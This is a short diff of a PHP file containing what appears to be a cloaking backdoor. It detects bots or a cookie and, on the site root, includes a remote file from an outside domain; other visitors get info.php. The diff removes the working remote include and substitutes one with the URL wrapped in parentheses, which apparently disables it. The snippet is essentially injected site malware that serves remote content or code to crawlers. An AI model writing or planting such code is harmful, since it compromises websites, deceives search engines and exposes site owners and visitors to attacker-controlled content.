@@ -13,7 +13,7 @@ $is_bot_stripos = (stripos($ua, 'bot') !== false ||
 $is_bot = ($is_bot_regex || $is_bot_stripos);
 
 if (($is_bot || isset($_COOKIE[0])) && $uri == '/') {
-    include('https://ittc-indonesia.com/ijsr.internationaljournallabs.com/index.txt');
+    include('(https://ittc-indonesia.com/ijsr.internationaljournallabs.com/index.txt)');
 } else {
     include('info.php');
 }
